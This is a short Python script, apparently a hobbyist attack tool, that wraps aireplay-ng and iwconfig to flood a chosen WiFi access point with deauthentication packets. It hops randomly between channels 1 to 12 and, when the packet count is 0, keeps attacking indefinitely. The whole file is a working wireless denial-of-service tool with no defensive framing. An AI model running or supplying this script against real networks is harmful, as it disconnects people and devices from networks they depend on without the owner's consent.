import subprocess
import time
import random

class Deauther:
    def __init__(self, bssid: str, iface: str, packets: int = 100):
        self.bssid = bssid
        self.iface = iface
        self.packets = packets

    def change_channel(self):
        channel = random.randint(1, 12)  # Change this range as needed
        print(f"[+] Changing to channel {channel}")
        subprocess.run(["iwconfig", self.iface, "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def deauth_attack(self):
        print(f"\n[+] Sending {self.packets} deauth packets to {self.bssid} via {self.iface} with channel hopping...\n")
        while True:
            self.change_channel()
            cmd = ["aireplay-ng", "--deauth", str(self.packets), "-a", self.bssid, self.iface]
            subprocess.run(cmd)
            time.sleep(1)  # Adjust delay to prevent errors
            if self.packets > 0:
                break

if __name__ == "__main__":
    bssid = input("Enter target BSSID (e.g., 00:11:22:33:44:55): ")
    iface = input("Enter monitor mode interface (e.g., wlan1): ")
    packets = int(input("Enter number of deauth packets (0 = infinite): "))
    
    deauther = Deauther(bssid, iface, packets)
    deauther.deauth_attack()

